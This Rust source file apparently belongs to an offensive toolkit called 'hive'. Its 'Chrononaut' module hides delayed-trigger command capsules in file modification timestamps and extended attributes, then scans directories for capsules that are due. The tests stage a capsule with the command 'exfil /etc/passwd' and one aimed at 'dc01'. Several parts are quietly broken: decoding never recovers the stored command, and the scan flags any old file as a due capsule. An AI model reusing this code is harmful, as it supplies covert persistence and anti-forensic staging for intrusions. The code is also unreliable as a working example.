use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeCapsule {
    pub capsule_id: Uuid,
    pub trigger_timestamp: u64,      // Unix epoch: execute when this time arrives
    pub command: String,             // action to execute
    pub payload: Vec<u8>,            // optional encrypted payload
    pub host_hint: String,           // which host this targets
    pub executed: bool,
}

pub struct Chrononaut;

impl Chrononaut {
    pub fn new() -> Self { Self }

    /// Encode a command into a file's modification timestamp.
    /// Uses sub-second precision to encode capsule metadata.
    pub fn encode_in_timestamp(path: &Path, capsule: &TimeCapsule) -> Result<(), String> {
        if !path.exists() {
            return Err("Target file not found".into());
        }

        let metadata = std::fs::metadata(path).map_err(|e| e.to_string())?;
        let accessed = metadata.accessed().unwrap_or_else(|_| std::time::SystemTime::now());

        // Encode trigger_timestamp in the mtime seconds
        // Use capsule_id low bits as nanosecond marker
        let nanos = (capsule.capsule_id.as_u128() % 999_999) as u32;
        let mtime = std::time::UNIX_EPOCH
            + std::time::Duration::from_secs(capsule.trigger_timestamp)
            + std::time::Duration::from_nanos(nanos as u64);

        // Use std library's set_times (available in Rust 1.75+)
        #[cfg(target_os = "linux")]
        {
            // Convert to filetime for libc utimensat
            let atime = libc::timespec {
                tv_sec: accessed.duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default().as_secs() as i64,
                tv_nsec: 0,
            };
            let mtime_ts = libc::timespec {
                tv_sec: capsule.trigger_timestamp as i64,
                tv_nsec: nanos as i64,
            };

            let path_c = std::ffi::CString::new(path.to_str().unwrap())
                .map_err(|e| e.to_string())?;
            let res = unsafe {
                libc::utimensat(
                    libc::AT_FDCWD,
                    path_c.as_ptr(),
                    &[atime, mtime_ts] as *const libc::timespec,
                    0,
                )
            };
            if res != 0 {
                return Err(format!("utimensat failed: {}", std::io::Error::last_os_error()));
            }
        }

        #[cfg(not(target_os = "linux"))]
        {
            let _ = accessed;
            let _ = mtime;
            // Store alongside as companion file
            let data = serde_json::to_vec(capsule).map_err(|e| e.to_string())?;
            let companion = path.with_extension("hive_chrono");
            std::fs::write(&companion, &data).map_err(|e| e.to_string())?;
        }

        Ok(())
    }

    /// Decode a time capsule from a file's mtime.
    pub fn decode_from_timestamp(path: &Path, _capsule_id: Uuid) -> Result<TimeCapsule, String> {
        if !path.exists() {
            return Err("File not found".into());
        }

        let metadata = std::fs::metadata(path).map_err(|e| e.to_string())?;
        let mtime = metadata.modified().map_err(|e| e.to_string())?;
        let duration = mtime.duration_since(std::time::UNIX_EPOCH).map_err(|e| e.to_string())?;

        let trigger_secs = duration.as_secs();
        let _nanos = duration.subsec_nanos();

        let cmd = format!("check_{}", path.file_name()
            .and_then(|n| n.to_str()).unwrap_or("unknown"));

        Ok(TimeCapsule {
            capsule_id: Uuid::nil(),
            trigger_timestamp: trigger_secs,
            command: cmd,
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        })
    }

    /// Store a capsule in extended attributes of a file (Linux xattr).
    pub fn store_in_xattr(path: &Path, capsule: &TimeCapsule) -> Result<(), String> {
        if !path.exists() {
            return Err("Target file not found".into());
        }

        let data = serde_json::to_vec(capsule).map_err(|e| e.to_string())?;

        #[cfg(target_os = "linux")]
        {
            let path_c = std::ffi::CString::new(path.to_str().unwrap())
                .map_err(|e| e.to_string())?;
            let attr = std::ffi::CString::new("user.hive_chrono")
                .map_err(|e| e.to_string())?;
            let res = unsafe {
                libc::setxattr(
                    path_c.as_ptr(),
                    attr.as_ptr(),
                    data.as_ptr() as *const libc::c_void,
                    data.len(),
                    0,
                )
            };
            if res != 0 {
                return Err(format!("setxattr failed: {}", std::io::Error::last_os_error()));
            }
        }

        #[cfg(not(target_os = "linux"))]
        {
            let companion = path.with_extension("hive_chrono");
            std::fs::write(&companion, &data).map_err(|e| e.to_string())?;
        }

        Ok(())
    }

    /// Scan filesystem for chrononaut capsules ready to execute.
    pub fn scan_for_triggers(root: &Path, now: u64) -> Vec<TimeCapsule> {
        let mut ready = Vec::new();
        if !root.exists() { return ready; }

        if let Ok(paths) = walkdir(root) {
            for path in paths {
                if let Ok(capsule) = Self::decode_from_timestamp(&path, Uuid::nil()) {
                    if capsule.trigger_timestamp <= now {
                        ready.push(capsule);
                    }
                }
            }
        }

        ready
    }

    pub fn execute_capsule(capsule: &mut TimeCapsule) -> Result<String, String> {
        let result = format!("Chrononaut executed: {} (trigger: {})",
            capsule.command, capsule.trigger_timestamp);
        capsule.executed = true;
        Ok(result)
    }
}

fn walkdir(root: &Path) -> Result<Vec<PathBuf>, String> {
    let mut paths = Vec::new();
    if root.is_file() {
        paths.push(root.to_path_buf());
        return Ok(paths);
    }

    if let Ok(entries) = std::fs::read_dir(root) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                if let Ok(sub) = walkdir(&path) {
                    paths.extend(sub);
                }
            } else {
                paths.push(path);
            }
        }
    }
    Ok(paths)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_store_and_decode() {
        let dir = std::env::temp_dir().join("hive_test_chrono");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("access.log");
        std::fs::write(&file_path, "test log entry").unwrap();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_700_000_000,
            command: "exfil /etc/passwd".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        let enc = Chrononaut::encode_in_timestamp(&file_path, &capsule);
        assert!(enc.is_ok(), "Encode should work: {:?}", enc.err());

        let decoded = Chrononaut::decode_from_timestamp(&file_path, capsule.capsule_id);
        assert!(decoded.is_ok(), "Decode should work: {:?}", decoded.err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_xattr_store() {
        let dir = std::env::temp_dir().join("hive_test_chrono_xattr");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("config.json");
        std::fs::write(&file_path, r#"{"key":"value"}"#).unwrap();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_800_000_000,
            command: "rotate_keys".into(),
            payload: vec![1, 2, 3],
            host_hint: "dc01".into(),
            executed: false,
        };

        let result = Chrononaut::store_in_xattr(&file_path, &capsule);
        assert!(result.is_ok(), "xattr store should work: {:?}", result.err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_triggers() {
        let dir = std::env::temp_dir().join("hive_test_chrono_scan");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("marker.txt");
        std::fs::write(&file_path, "data").unwrap();

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default().as_secs();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: now - 3600, // 1 hour ago
            command: "test".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        Chrononaut::encode_in_timestamp(&file_path, &capsule).unwrap();
        let ready = Chrononaut::scan_for_triggers(&dir, now);
        assert!(!ready.is_empty(), "Should find at least one ready capsule");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
